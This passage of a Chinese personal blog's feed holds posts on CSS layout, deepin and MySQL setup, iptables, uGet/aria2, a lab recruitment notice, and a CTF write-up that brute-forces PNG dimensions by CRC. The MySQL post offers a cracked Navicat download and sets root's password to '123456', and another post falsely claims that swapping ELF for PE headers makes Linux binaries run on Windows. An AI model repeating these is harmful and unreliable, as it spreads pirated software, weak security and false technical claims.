src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200317114053835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>也可在网页界面<strong>按快捷键Ctrl+F5</strong></p><h3 id="4-如何自适应"><a href="#4-如何自适应" class="headerlink" title="4.如何自适应"></a>4.如何自适应</h3><p>我看了下大多数人都没有用到margin:auto,可能你是用的padding-left或margin-left或绝对定位（虽然可以居中,但是麻烦）使得在你自己电脑上看着好像居中了。比如下面这张图，<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200318133002375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>左边的logo部分就用的padding-left:130px;,在你的电脑上看着距离挺合适和原图差不多。</p><p>但是当你缩放时这时logo这部分距离左边仍然是130px,这就会造成整体左移.<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200318133023700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>那如何让它居中呢，这时缩放时你应该让它距左边不能是130px了，而应该是一个更大的值，但是如果你写死宽度，就不能做到然他自动变化，所以就要用到margin:auto.具体怎么用margin:auto参考左右浮动布局讲解或网上自行查找资料（必须学会用居中！！！）<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200318133051123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本篇文章并不能包含所有大家遇到的问题，有些问题也需要大家自己去搜索解决。文章为个人经验所写，如有错误，请联系我更正。都看到这了，点个赞再走吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;第一次考核已经结束，我们也看了大家的作业，总体来说基本大模样都能写出来，但都存在着这样那样的小问题，大家刚接触这也很正常，下面汇集了大家常见的问题，希望能对大家有所帮助，大家努力努力这几天修改下自己的代码。&lt;/p&gt;
&lt;/blockquot
      
    
    </summary>
    
    
      <category term="107网站工作室" scheme="http://yoursite.com/categories/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>deepin终端暂时使用代理</title>
    <link href="http://yoursite.com/2020/03/13/deepin%E7%BB%88%E7%AB%AF%E6%9A%82%E6%97%B6%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/13/deepin%E7%BB%88%E7%AB%AF%E6%9A%82%E6%97%B6%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86/</id>
    <published>2020-03-13T10:45:00.000Z</published>
    <updated>2020-04-07T15:11:59.301Z</updated>
    
    <content type="html"><![CDATA[<hr><p>我用的是electron-ssr，其他工具类似<br>首先查看下代理端口，如图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200313165830364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>终端输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://127.0.0.1:12333"</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">"http://127.0.0.1:12333"</span></span><br></pre></td></tr></table></figure><p>通过curl <a href="http://www.google.com命令可以测试终端走没走代理" target="_blank" rel="noopener">www.google.com命令可以测试终端走没走代理</a></p><p><strong>这种方法只是一次性的你退出终端再次打开就不走代理了</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;我用的是electron-ssr，其他工具类似&lt;br&gt;首先查看下代理端口，如图&lt;br&gt;&lt;img src=&quot;/&quot; class=&quot;lazyload&quot; data-src=&quot;https://img-blog.csdnimg.cn/20200313165830364.png
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>相同c++程序在Linux和windows不能共用</title>
    <link href="http://yoursite.com/2020/03/12/%E7%9B%B8%E5%90%8Cc++%E7%A8%8B%E5%BA%8F%E5%9C%A8Linux%E5%92%8Cwindows%E4%B8%8D%E8%83%BD%E5%85%B1%E7%94%A8/"/>
    <id>http://yoursite.com/2020/03/12/%E7%9B%B8%E5%90%8Cc++%E7%A8%8B%E5%BA%8F%E5%9C%A8Linux%E5%92%8Cwindows%E4%B8%8D%E8%83%BD%E5%85%B1%E7%94%A8/</id>
    <published>2020-03-12T13:45:00.000Z</published>
    <updated>2020-04-07T09:09:21.693Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>最近在linux上写了个C++程序，却发现不能在win上运行，经搜索发现结果如下，特此记录一下。</p></blockquote><h3 id="答案："><a href="#答案：" class="headerlink" title="答案："></a>答案：</h3><p>Linux下gcc或g++编译出的可执行文件文件头是ELF windows下可执行文件头是PE，所以不能共用。</p><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><p>所以只要把Linux下编译出的可执行文件头去掉，然后加上一个PE文件头就可以在windows下跑了。<br>当然你也可在虚拟机下复制粘贴下代码也可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在linux上写了个C++程序，却发现不能在win上运行，经搜索发现结果如下，特此记录一下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;答案：&quot;&gt;&lt;a href=&quot;#答案：&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>107网站工作室简介</title>
    <link href="http://yoursite.com/2020/03/05/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%AE%80%E4%BB%8B/"/>
    <id>http://yoursite.com/2020/03/05/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%AE%80%E4%BB%8B/</id>
    <published>2020-03-05T06:45:00.000Z</published>
    <updated>2020-04-07T15:12:12.493Z</updated>
    
    <content type="html"><![CDATA[<hr><p>鉴于疫情期间大家对107实验室招新反响较低，在此再次做些说明，打扰到大家还请见谅。</p><h1 id="1-实验室是干什么的？？"><a href="#1-实验室是干什么的？？" class="headerlink" title="1.实验室是干什么的？？"></a>1.实验室是干什么的？？</h1><p>简单来说就是写网站的，学院官网和其他部分学院官网均出自107网站工作室。</p><h1 id="2-学习内容难不难，我是小白怎么办？？"><a href="#2-学习内容难不难，我是小白怎么办？？" class="headerlink" title="2.学习内容难不难，我是小白怎么办？？"></a>2.学习内容难不难，我是小白怎么办？？</h1><p>我们实验室招的就是小白，我们会给大家发些学习视频等资源，只要大家认真观看并付诸行动，脱离小白不是梦。</p><h1 id="3-进实验室我能得到些什么？？"><a href="#3-进实验室我能得到些什么？？" class="headerlink" title="3.进实验室我能得到些什么？？"></a>3.进实验室我能得到些什么？？</h1><ul><li>平常不仅会教大家网站方面的技能也会在电脑使用技巧等方面竭力帮助大家。于本人而言，这是我对计算机的一个启蒙。<ul><li>写网站可培养逻辑能力，网站文件的结构布局和大量代码的编写对日后专业课的学习非常有帮助。</li><li>赚点外快，努力点挣个学费完全没问题。</li><li>每年实验室负责人可获得360免简历筛选直接面试的资格。</li></ul></li></ul><h1 id="4-寄语"><a href="#4-寄语" class="headerlink" title="4.寄语"></a>4.寄语</h1><p>无论大家是选择107实验室还是其他实验室，一定要选择一个实验室并认真学习，差距往往就是不经意间拉开的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;鉴于疫情期间大家对107实验室招新反响较低，在此再次做些说明，打扰到大家还请见谅。&lt;/p&gt;
&lt;h1 id=&quot;1-实验室是干什么的？？&quot;&gt;&lt;a href=&quot;#1-实验室是干什么的？？&quot; class=&quot;headerlink&quot; title=&quot;1.实验室是干什么的？？&quot;&gt;
      
    
    </summary>
    
    
      <category term="107网站工作室" scheme="http://yoursite.com/categories/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    
  </entry>
  
  <entry>
    <title>CRC爆破宽高</title>
    <link href="http://yoursite.com/2020/02/27/CRC%E7%88%86%E7%A0%B4%E5%AE%BD%E9%AB%98/"/>
    <id>http://yoursite.com/2020/02/27/CRC%E7%88%86%E7%A0%B4%E5%AE%BD%E9%AB%98/</id>
    <published>2020-02-27T06:45:00.000Z</published>
    <updated>2020-04-07T15:12:09.393Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时CTF杂项给一张png图片,linux下打不开（白屏），Windows下可查看图片，就可能是宽高被修改</p><h1 id="解析IHDR"><a href="#解析IHDR" class="headerlink" title="解析IHDR"></a>解析IHDR</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200227210108183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>选自2020安恒月赛<br>下载压缩包解压出一张PNG图片，linux下打不开，如图所示<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200227210335803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>猜测是对其高或宽进行了更改，需要进行CRC爆破以获得原来的宽和高，修改回去就行了。</p><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'test.png'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = int(all_b[<span class="number">29</span>:<span class="number">33</span>].hex(),<span class="number">16</span>)</span><br><span class="line">    data = bytearray(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">            height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                print(<span class="string">"宽为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(width)</span><br><span class="line">                print(<span class="string">"高为："</span>,end=<span class="string">""</span>)</span><br><span class="line">                print(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>根据结果发现高被改了<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200227210714199.png"  alt="在这里插入图片描述"><br>修改回去即可<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020022721073323.png"  alt="在这里插入图片描述"><br>图片正常显示，得到flag<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200227210815855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有时CTF杂项给一张png图片,linux下打不开（白屏），Windows下可查看图片，就可能是宽高被修改&lt;/p&gt;
&lt;h1 id=
      
    
    </summary>
    
    
      <category term="CTF-杂项" scheme="http://yoursite.com/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云服务器无法访问解决方案</title>
    <link href="http://yoursite.com/2020/02/27/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://yoursite.com/2020/02/27/%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2020-02-27T01:45:00.000Z</published>
    <updated>2020-04-07T09:09:17.441Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>网上大部分是阿里云控制台没开放80端口，之前遇到了这个问题，开放了80端口一也无法解决，后来看到了一篇文章解决了访问的问题，在此记录下。</p></blockquote><p>首先在服务器上运行curl <a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a> 会显示页面内容。<br>但是curl 公网ip 无法连接，报错 curl: (7) Failed to connect to ** port 80: No route to host</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h5 id="操作防火墙，开放端口"><a href="#操作防火墙，开放端口" class="headerlink" title="操作防火墙，开放端口"></a>操作防火墙，开放端口</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;网上大部分是阿里云控制台没开放80端口，之前遇到了这个问题，开放了80端口一也无法解决，后来看到了一篇文章解决了访问的问题，在此记录下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先在服务器上运行curl &lt;a href=&quot;http:/
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>deepin安装mysql</title>
    <link href="http://yoursite.com/2020/02/24/deepin%E5%AE%89%E8%A3%85mysql/"/>
    <id>http://yoursite.com/2020/02/24/deepin%E5%AE%89%E8%A3%85mysql/</id>
    <published>2020-02-24T10:45:00.000Z</published>
    <updated>2020-04-07T15:12:00.877Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>问题：deepin用终端安装mysql，却安装的一直是MariaDB，找到了一个下载安装包安装的方法，并添加了些安装时遇到的问题，在此记录下。</p></blockquote><div class="htmledit_views" id="content_views">                                            <h3><a name="t0"></a><a name="t0"></a>第一步、&nbsp;</h3><p>首先去官网下载mysql的安装包<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="nofollow noopener">https://dev.mysql.com/downloads/mysql/</a></p><p>linux generic 的64位的tar -xJvf mysql-8.0.18-linux-glibc2.12-x86_64.tar.xz&nbsp;</p><p><img alt="" class="has lazyload" height="186" src="/" width="889" data-src="https://img-blog.csdnimg.cn/20191031195545619.png"></p><h3><a name="t1"></a><a name="t1"></a>第二步、解包</h3><p>找到下载好的64位mysql安装包</p<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -xJvf mysql-8.0.18-linux-glibc2.12-x86_64.tar.xz</span><br></pre></td></tr></table></figure><p>移动到指定位置：一定要这个位置，原因是在mysql配置文件中写死了，这样的好处是可以直接用默认文件启动mysql服务&nbsp;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv mysql-8.0.18-linux-glibc2.12-x86_64/ /usr/local/mysql</span><br></pre></td></tr></table></figure><h3><a name="t2"></a><a name="t2"></a>第三步、创建mysql用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -r -s /bin/false mysql</span><br></pre></td></tr></table></figure><h3><a name="t3"></a><a name="t3"></a>第四步、生成root密码并打印密码（在/usr/local/mysql 目录下执行）</h3><p><span style="color:#f33b45;">首先 cd 进入解压缩的文件夹内</span></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/mysql</span><br></pre></td></tr></table></figure><p>然后执行初始化mysql的密码========&gt;注意这里会获得root密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./bin/mysqld <span class="comment">--user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --initialize</span></span><br></pre></td></tr></table></figure><p>&nbsp;<img alt="" class="has lazyload" height="162" src="/" width="816" data-src="https://img-blog.csdnimg.cn/20191101020326603.png"></p><p>启动mysql服务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./support-files/mysql.server <span class="keyword">start</span></span><br></pre></td></tr></table></figure><p>登录mysql服务器修改root密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./bin/mysql -u root -p</span><br></pre></td></tr></table></figure><blockquote><p>此处可能会提示<strong>ERROR 2002</strong> (HY000): Can’t connect to local MySQL server through socket ‘/var/lib/mysql/mysql.sock’ (13)<br>，执行下sudo ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock就可以了（注意权限问题，如果没/var/lib/mysql/的权限也会报错）</p></blockquote><p>将上面获得的密码通过右键粘贴进去登录到mysql</p><p>修改root密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'123456'</span>;</span><br></pre></td></tr></table></figure><blockquote><p>&nbsp;下面的两条命令是让navicat等客户端连接mysql的建议执行一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'123456'</span>  <span class="keyword">PASSWORD</span> <span class="keyword">EXPIRE</span> <span class="keyword">NEVER</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">'123456'</span>;</span><br></pre></td></tr></table></figure></blockquote><p>&nbsp;后序操作，配置环境变了 和 开机自启服务</p><h3>第五步、配置环境变量，让mysql可以在任何位置下都可以直接执行</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure><h3><a name="t5"></a><a name="t5"></a>&nbsp;将下面的代码添加到文件末尾</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MYSQL_HOME</span></span><br><span class="line"><span class="built_in">export</span> MYSQL_HOME=/usr/<span class="built_in">local</span>/mysql</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$MYSQL_HOME</span>/bin</span><br></pre></td></tr></table></figure><p>一定要记得刷新配置然后环境变量生效</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>&nbsp;</p><hr><h3><a name="t6"></a><a name="t6"></a>第六步、开机自启服务</h3><p>将mysql的默认脚本复制到/etc/init.d&nbsp; 取名叫mysqld就可以全局通过service mysqld start手动启动</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld</span><br></pre></td></tr></table></figure><p>执行service mysqld start相当于手动开启mysql，将他添加到开机自启服务中</p><p>下面是让开机时自动执行这条命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/rc.local</span><br></pre></td></tr></table></figure><p>添加内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># rc.local config file created by use</span></span><br><span class="line"> </span><br><span class="line">service mysqld start</span><br><span class="line"> </span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>给予执行权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /etc/rc.local</span><br></pre></td></tr></table></figure><p>然后重启即可！deepin官网有解释：<a href="https://wiki.deepin.org/wiki/%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F" target="_blank" rel="nofollow noopener">deepin自启动程序</a></p><p>&nbsp;</p><h3><a name="t7"></a><a name="t7"></a>&nbsp;常见错误解决方式：</h3><p>如果是初始化遇到了问题，你可以删除对应数据（/usr/local/mysql/data）在初始化的时候指定的，</p><p>如果没有指定可以删除mysql整个文件夹，然后重新安装</p><p>先删除对应文件夹</p><p>（mysql要先关闭）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/mysql/bin/mysqld <span class="keyword">stop</span></span><br></pre></td></tr></table></figure><p>删除数据，然后重新初始化root用户和密码&nbsp;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /usr/local/mysql/data</span><br></pre></td></tr></table></figure><p>紧接着，从博客上面的第二步重复执行命令即可，不要跳过命令！要一条一条执行，创建过mysql用户的哪天命令第二次可以不用执行了，因为前面已经创建过了，会提示用户已存在。</p></blockquote><p>另外赠送navicat12的包，压缩包目录里有我写好的txt文件。直接解压缩就能使用 免激活。官网的最新版在deepin上运行会报错，建立连接&nbsp;</p><p>链接: <a href="https://pan.baidu.com/s/18NecXedG3SuRCZqJCO0B1g" target="_blank" rel="nofollow noopener">https://pan.baidu.com/s/18NecXedG3SuRCZqJCO0B1g</a> 提取码: w8x5</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;问题：deepin用终端安装mysql，却安装的一直是MariaDB，找到了一个下载安装包安装的方法，并添加了些安装时遇到的问题，在此记录下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;htmledit_views&quot; i
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux下uGet配合aria2</title>
    <link href="http://yoursite.com/2020/02/22/Linux%E4%B8%8BuGet%E9%85%8D%E5%90%88aria2/"/>
    <id>http://yoursite.com/2020/02/22/Linux%E4%B8%8BuGet%E9%85%8D%E5%90%88aria2/</id>
    <published>2020-02-22T07:45:00.000Z</published>
    <updated>2020-04-07T09:09:30.193Z</updated>
    
    <content type="html"><![CDATA[<hr><div id="content_views" class="markdown_views prism-atom-one-dark"><path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>                    </svg>                                            <ol><li><p>安装uGet：软件中心即可安装。</p></li><li><p>安装aria2： <code>sudo apt-get install aria2</code></p></li><li><p>打开uget并最大化，点击edit-&gt;setting<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20190112141003979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nsa3NqeA==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p></li><li><p>点击插件，选aria2，其他默认即可，点击ok。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20190112141120796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nsa3NqeA==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p></li><li><p>如果出现不能下载的问题，如uGet弹出<code>Error occourred when downloading</code>。可能是aria2的问题，在terminal中执行<code>aria2c --daemon --enable-rpc=true</code>即可 。<a href="https://askubuntu.com/questions/342433/uget-with-aria2-plugin" target="_blank" rel="nofollow noopener">参考链接</a></p></li><li><p>如需下载迅雷链接，需要多进行一步链接转换。迅雷下载协议是经过加密的,如：<br>thunder://QUFodHRwOi8vd3d3LmNub3N3aWtpLmNvbS93cC1jb250ZW50L3RoZW1lcy9tb25vY2hyb21lL2ltZy9sb2dvLmdpZlpa，直接在Linux下面是没有办法下载的。<br>在ubuntu中，可在终端下使用<code>echo url|base64 -d</code> 来显示解密后的地址。如（URL为迅雷链接去掉开头）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span></span><br><span class="line">QUFodHRwOi8vd3d3LmNub3N3aWtpLmNvbS93cC1jb250ZW50L3RoZW1lcy9tb25vY2hyb21lL2ltZy9sb2dvLmdpZlpa</span><br><span class="line">|base64 -d</span><br></pre></td></tr></table></figure><p>显示结果是：<br><code>AAhttp://www.cnoswiki.com/wp-content/themes/monochrome/img/logo.gifZZ</code><br>然后去除开头的AA和结尾的ZZ既是解密后的地址：<br><code>http://www.cnoswiki.com/wp-content/themes/monochrome/img/logo.gif</code><br>拿到解密后的地址后，就可以使用uGet下载工具进行下载！<br><a href="https://blog.csdn.net/cjmiou/article/details/41152195" target="_blank" rel="noopener">参考链接</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;div id=&quot;content_views&quot; class=&quot;markdown_views prism-atom-one-dark&quot;&gt;
&lt;path stroke-linecap=&quot;round&quot; d=&quot;M5,0 0,2.5 5,5z&quot; id=&quot;raphael-marker
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>deepin添加启动图标(快捷方式)</title>
    <link href="http://yoursite.com/2020/02/21/deepin%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E5%9B%BE%E6%A0%87(%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F)/"/>
    <id>http://yoursite.com/2020/02/21/deepin%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E5%9B%BE%E6%A0%87(%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F)/</id>
